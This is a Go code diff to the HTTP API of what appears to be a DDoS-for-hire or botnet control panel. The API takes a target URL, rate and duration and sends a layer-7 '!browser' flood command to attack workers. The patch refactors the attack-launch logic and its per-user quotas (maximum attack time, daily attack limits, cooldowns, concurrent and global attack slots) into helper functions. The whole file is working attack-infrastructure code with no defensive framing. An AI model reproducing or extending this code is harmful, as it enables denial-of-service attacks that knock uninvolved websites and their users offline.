@@ -6,7 +6,6 @@ import (
 	"net/http"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/gorilla/mux"
 )
@@ -41,7 +40,7 @@ func NewAPI() {
 		user, err := FindUser(r.URL.Query().Get("user"))
 		if err != nil || user == nil {
 			w.WriteHeader(http.StatusUnauthorized)
-			response, err := json.Marshal(&Result{Success: false, Error: "unknown username"})
+			response, err := json.Marshal(&Result{Success: false, Error: "Unknown username"})
 			if err != nil {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
@@ -51,7 +50,7 @@ func NewAPI() {
 			return
 		} else if user.Password != r.URL.Query().Get("password") {
 			w.WriteHeader(http.StatusForbidden)
-			response, err := json.Marshal(&Result{Success: false, Error: "unknown password for that user"})
+			response, err := json.Marshal(&Result{Success: false, Error: "Unknown password for that user"})
 			if err != nil {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
@@ -61,7 +60,7 @@ func NewAPI() {
 			return
 		} else if !user.API {
 			w.WriteHeader(http.StatusForbidden)
-			response, err := json.Marshal(&Result{Success: false, Error: "you don't have api access"})
+			response, err := json.Marshal(&Result{Success: false, Error: "You don't have API access"})
 			if err != nil {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
@@ -71,111 +70,28 @@ func NewAPI() {
 			return
 		}
 
-		// Si el método es !browser, manejarlo por separado (sin bots)
 		if r.URL.Query().Get("method") == "!browser" {
 			url := r.URL.Query().Get("target")
-			rateStr := r.URL.Query().Get("rate")
 			durationStr := r.URL.Query().Get("duration")
-			if url == "" || rateStr == "" || durationStr == "" {
-				w.WriteHeader(http.StatusBadRequest)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "missing parameters: target, rate, duration"})
+			rateStr := r.URL.Query().Get("rate")
+			if url == "" || durationStr == "" || rateStr == "" {
+				json.NewEncoder(w).Encode(&Result{Success: false, Error: "Missing parameters: target, duration, rate"})
 				return
 			}
-			rate, err := strconv.Atoi(rateStr)
-			if err != nil || rate < 1 || rate > 250 {
-				w.WriteHeader(http.StatusBadRequest)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "rate must be 1-250"})
-				return
-			}
-			duration, err := strconv.Atoi(durationStr)
-			if err != nil || duration <= 0 {
-				w.WriteHeader(http.StatusBadRequest)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "invalid duration"})
-				return
-			}
-			if duration > user.Maxtime {
-				w.WriteHeader(http.StatusForbidden)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: fmt.Sprintf("duration exceeds user maxtime (%d)", user.Maxtime)})
-				return
-			}
-
-			sent, err := UserOngoingAttacks(user.Username, time.Date(time.Now().Year(), time.Now().Month(), time.Now().Day(), 0, 0, 0, 0, time.Now().Location()))
-			if err == nil && len(sent) >= user.MaxDaily && !user.Admin {
-				w.WriteHeader(http.StatusForbidden)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "daily attack limit exceeded"})
-				return
-			}
-
-			thererunning, _ := UserOngoingAttacks(user.Username, time.Now())
-			if len(thererunning) > 0 && user.Cooldown > 0 {
-				recent := thererunning[0]
-				for _, a := range thererunning {
-					if a.Sent > recent.Sent {
-						recent = a
-					}
-				}
-				if recent.Sent+int64(user.Cooldown) > time.Now().Unix() {
-					w.WriteHeader(http.StatusForbidden)
-					json.NewEncoder(w).Encode(&Result{Success: false, Error: "user in cooldown"})
-					return
-				}
-			}
-
-			running, err := UserOngoingAttacks(user.Username, time.Now())
+			args := []string{url, durationStr, rateStr}
+			attack, err := ParseL7Attack("browser", args, user)
 			if err != nil {
-				w.WriteHeader(http.StatusInternalServerError)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "error checking concurrent attacks"})
+				json.NewEncoder(w).Encode(&Result{Success: false, Error: err.Error()})
 				return
 			}
-			if user.Conns > 0 && len(running) >= user.Conns {
-				w.WriteHeader(http.StatusForbidden)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "concurrent attack limit exceeded"})
-				return
-			}
-
-			globalRunning, err := OngoingAttacks(time.Now())
-			if err != nil || len(globalRunning) >= Options.Templates.Attacks.MaximumOngoing {
-				w.WriteHeader(http.StatusServiceUnavailable)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "maximum global attack slots reached"})
-				return
-			}
-
-			workersMux.RLock()
-			workerCount := len(workers)
-			workersMux.RUnlock()
-			if workerCount == 0 {
-				w.WriteHeader(http.StatusServiceUnavailable)
-				json.NewEncoder(w).Encode(&Result{Success: false, Error: "no L7 workers available"})
-				return
-			}
-
-			cmd := map[string]interface{}{
-				"type":     "attack",
-				"method":   "browser",
-				"url":      url,
-				"rate":     rate,
-				"duration": duration,
-				"user":     user.Username,
-			}
-			SendToWorkers(cmd)
-
-			LogAttack(&AttackLog{
-				Target:   url,
-				Duration: duration,
-				Flags:    fmt.Sprintf("rate=%d", rate),
-				Sent:     time.Now().Unix(),
-				Finish:   time.Now().Add(time.Duration(duration) * time.Second).Unix(),
-				User:     user.Username,
-				Devices:  0,
-			})
-
+			SendL7Attack(attack)
 			w.WriteHeader(http.StatusOK)
 			json.NewEncoder(w).Encode(&Result{
 				Success:  true,
-				Target:   url,
-				Duration: strconv.Itoa(duration),
+				Target:   attack.URL,
+				Duration: strconv.Itoa(attack.Duration),
 				Method:   "!browser",
-				Flags:    map[string]string{"rate": strconv.Itoa(rate)},
+				Flags:    map[string]string{"rate": strconv.Itoa(attack.Rate)},
 			})
 			return
 		}
@@ -183,7 +99,7 @@ func NewAPI() {
 		method, ok := IsMethod(r.URL.Query().Get("method"))
 		if !ok || method == nil {
 			w.WriteHeader(http.StatusOK)
-			response, err := json.Marshal(&Result{Success: false, Error: "unknown method presented"})
+			response, err := json.Marshal(&Result{Success: false, Error: "Unknown method presented"})
 			if err != nil {
 				w.WriteHeader(http.StatusInternalServerError)
 				return
